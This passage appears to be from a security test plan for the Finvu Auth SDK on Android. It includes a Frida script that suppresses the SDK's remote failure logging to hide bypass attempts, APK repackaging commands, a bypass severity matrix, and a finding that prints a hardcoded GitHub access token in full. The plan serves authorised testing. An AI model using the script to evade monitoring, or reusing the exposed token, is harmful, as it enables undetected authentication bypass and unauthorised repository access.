**Important Note**: The SDK uses `network.getAllByName()` for DNS resolution (bound to cellular network). On a rooted device, the hosts file modification applies to all DNS lookups. However, `Network.getAllByName()` may bypass the hosts file on some Android versions because it resolves through the network's DNS servers.

**What This Proves**: Whether the SDK's custom DNS (via `network.getAllByName()`) can be overridden. If the hosts file is respected, an attacker with root access could redirect SNA traffic to a fake server.

---

### TC-BYPASS-13: Tamper `FinvuAuthLogManager` to Suppress Error Reporting

**Objective**: If the SDK reports SNA failures to a logging endpoint, suppress those reports to hide bypass attempts from monitoring.

**Prerequisites**: Rooted device, Frida.

**Frida Script**:

```javascript
// frida -U -f <package_name> -l suppress_logging.js

Java.perform(function() {
    var FinvuAuthLogManager = Java.use(
        "com.finvu.android.authenticationwrapper.manager.FinvuAuthLogManager"
    );

    // Suppress all logging to the remote endpoint
    FinvuAuthLogManager.sendEventLog.implementation = function(eventLog, completion) {
        console.log("[SUPPRESS] Blocked event log: " + eventLog.eventName.value);
        // Optionally: modify the event log before sending
        // eventLog.status.value = "SUCCESS"; // fake success
        // eventLog.failureReason.value = null;
        // this.sendEventLog(eventLog, completion);
        // OR: just don't send it at all
        if (completion !== null) {
            completion.invoke(Java.use("kotlin.Result").success(Java.use("kotlin.Unit")));
        }
    };

    // Also suppress specific failure events
    FinvuAuthLogManager.logFailure.implementation = function(eventName, entityId, requestId, status, authProvider, authType, failureReason, userHandle, metaData, completion) {
        console.log("[SUPPRESS] Blocked failure log: " + eventName.stringValue.value + " reason: " + failureReason);
        if (completion !== null) {
            completion.invoke(Java.use("kotlin.Result").success(Java.use("kotlin.Unit")));
        }
    };
});
```

**What This Proves**: Whether the monitoring/logging can be disabled to hide bypass attempts. If the logging endpoint is the only way the server detects SNA failures, suppressing it could allow bypass to go undetected.

---

### TC-BYPASS-14: Modify Network Security Config to Force HTTPS

**Objective**: The current config allows cleartext HTTP to SNA domains. Test whether forcing HTTPS-only breaks the SNA flow (indicating some operator endpoints use HTTP).

**Steps**:

```bash
# 1. Decompile the APK
apktool d finvu-auth-sdk.apk -o finvu-decompiled

# 2. Edit the network security config
# Change: cleartextTrafficPermitted="true"
# To:     cleartextTrafficPermitted="false"
# Or remove the domain-config entries entirely

# 3. Rebuild and resign the APK
apktool b finvu-decompiled -o finvu-modified.apk
apksigner sign --ks my-key.jks --out finvu-modified-signed.apk finvu-modified.apk

# 4. Install and test
adb install finvu-modified-signed.apk
```

**What This Proves**: Whether the SNA redirect chain includes HTTP endpoints. If the flow breaks when cleartext is disabled, some operator domains use HTTP — a potential MITM vector.

---

## Phase 6: Comprehensive Bypass Assessment Matrix

| Bypass Method | Client-Side Feasible? | Server-Side Blocked? | Detection Risk | Severity if Bypassable |
|---|---|---|---|---|
| TC-BYPASS-01: Spoof `isCellularAvailable()` | Yes | Yes — `requestNetwork()` still fails | Low | Info only |
| TC-BYPASS-02: Inject Wi-Fi network as cellular | Yes | **Must test** — depends on server IP validation | Medium | **HIGH** |
| TC-BYPASS-03: Remove cellular binding from OkHttpClient | Yes | **Must test** — depends on server IP validation | Medium | **HIGH** |
| TC-BYPASS-04: Replay captured `snaToken` | Yes | **Must test** — depends on token binding/expiry | High (token visible in logs) | **CRITICAL** |
| TC-BYPASS-05: Inject custom SNA URL | Yes | N/A — tests input validation | Low | MEDIUM |
| TC-BYPASS-06: Capture redirect chain | Yes | N/A — information disclosure | Low | INFO |
| TC-BYPASS-07: Fake success response | Yes | **Must test** — does server validate the token? | Medium | **CRITICAL** |
| TC-BYPASS-08: Full cellular network spoof | Yes | **Must test** — the definitive bypass test | High | **CRITICAL** |
| TC-BYPASS-09: Spoof MCC/MNC | Yes | **Must test** — routing validation? | Low | MEDIUM |
| TC-BYPASS-10: SNA URL external replay | Yes | **Must test** — nonce/expiry/IP binding? | Low | **HIGH** |
| TC-BYPASS-11: MITM WebView traffic | Yes (root) | N/A — information disclosure | Medium | INFO → MEDIUM |
| TC-BYPASS-12: DNS redirection | Yes (root) | **Must test** — does custom DNS override work? | Medium | **HIGH** |
| TC-BYPASS-13: Suppress error logging | Yes | N/A — hides detection | Low | MEDIUM |
| TC-BYPASS-14: Force HTTPS-only | N/A (requires repackage) | N/A — tests for HTTP in chain | Low | MEDIUM |

---

## Recommended Test Execution Order

1. **TC-BYPASS-06** — Capture the full redirect chain first (establishes baseline understanding)
2. **TC-BYPASS-11** — MITM the WebView to understand the complete auth flow
3. **TC-BYPASS-10** — Extract and replay SNA URL externally (quick server-side validation check)
4. **TC-BYPASS-08** — Full cellular network spoof (most comprehensive bypass attempt)
5. **TC-BYPASS-07** — Fake success response (tests whether the server validates tokens at all)
6. **TC-BYPASS-04** — Replay captured snaToken (tests token binding)
7. **TC-BYPASS-02/03** — OkHttpClient-level bypasses (alternative approaches)
8. **TC-BYPASS-05** — SNA URL injection (input validation)
9. **TC-BYPASS-09** — MCC/MNC spoof (operator identity)
10. **TC-BYPASS-12** — DNS redirection
11. **TC-BYPASS-13** — Logging suppression
12. **TC-BYPASS-14** — HTTPS enforcement
13. **TC-BYPASS-01** — Basic cellular check spoof (least impact, confirms client-side only)

---

## Critical Finding: Hardcoded GitHub PAT

**File**: `FinvuAuthenticationWrapperSDK/build.gradle.kts:103`

```kotlin
credentials {
    username = "jenil-finvu"
    password = "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"
}
```

This is a GitHub Personal Access Token committed in source code. It grants access to the `Cookiejar-technologies/finvu-auth-sdk-android` GitHub Packages repository. **This token should be revoked immediately and replaced with a secret stored in environment variables or a secrets manager.**

---

*Testing approach document generated for Finvu Auth SDK Android v1.0.8*